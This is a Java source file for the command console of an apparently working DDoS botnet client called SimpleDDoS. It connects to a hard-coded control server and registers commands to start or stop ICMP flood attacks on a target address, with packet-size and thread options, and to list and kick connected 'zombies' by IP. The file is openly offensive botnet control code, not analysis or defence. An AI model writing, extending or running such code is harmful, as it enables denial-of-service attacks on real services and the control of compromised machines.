package org.ddos.client;

import java.io.IOException;
import java.util.Scanner;

import org.ddos.command.CommandActions;
import org.ddos.network.ClientNetwork;
import org.jcom.Command;
import org.jcom.CommandData;
import org.jcom.CommandInterface;
import org.jcom.FlagData;
import org.jcom.InvalidCommandArgumentsException;
import org.jcom.UnknownCommandException;
import org.jnetwork.Connection;

public class ClientMain {
	public static void main(String[] args) {
		try {
			ClientNetwork.setClient(new Connection("server2.jacobsrandomsite.com", 25565));
		} catch (IOException e) {
			e.printStackTrace();
		}

		CommandInterface commands = new CommandInterface();
		commands.putCommand("ddos",
				new CommandData("ddos [start|stop] <address> {-l size, -t threads}",
						"Starts or stops an attack on address.", 2,
						CommandActions.getDdosAction(), new FlagData("-l",
								"An integer which represents the byte size of each ICMP packet."),
				new FlagData("-t", "An integer which represents the amount of threads which will be pinging.")));
		commands.putCommand("kick",
				new CommandData("kick",
						"Kicks all of the zombies from the server. They will all have to reconnect to the server.", 0,
						CommandActions.getKickAllZombiesAction()),
				new CommandData("kick <address...>",
						"Kicks all given zombies from the server. The zombies will have to reconnect to the server.",
						-1, CommandActions.getKickAction()));
		commands.putCommand("list",
				new CommandData("list", "Gets the IP addresses of all zombies connected to the server.", 0,
						CommandActions.getListZombiesAction()));
		commands.putCommand("help",
				new CommandData("help", "Lists all commands and their usage.", 0,
						CommandActions.getUniversalHelpAction()),
				new CommandData("help <command>", "Gets help for the specified command.", 1,
						CommandActions.getHelpForCommandAction()));
		commands.putCommand("exit", new CommandData("exit", "Exits the SimpleDDoS client.", 0,
				CommandActions.getExitAction(), new FlagData("-k", "Kicks all of the zombies off of the server.")));

		Command lastCommand = null;
		try (Scanner in = new Scanner(System.in)) {
			while (true) {
				System.out.print("Delimination>");
				try {
					commands.executeCommand(lastCommand = CommandInterface.parseCommand(in.nextLine()));
				} catch (InvalidCommandArgumentsException e) {
					System.out.println("Usage(s): ");
					try {
						for (CommandData data : commands.getCommandData(lastCommand.getBaseCommand())) {
							System.out.println("\t" + data.getUsage());
						}
					} catch (UnknownCommandException e1) {
						// never happens
					}
				} catch (UnknownCommandException e) {
					System.out.println("Unknown command: " + lastCommand.getBaseCommand());
					System.out.println(
							"Type \"help\" for a list of commands or \"help <command>\" for help with a specific command.");
				}
			}
		}
	}
}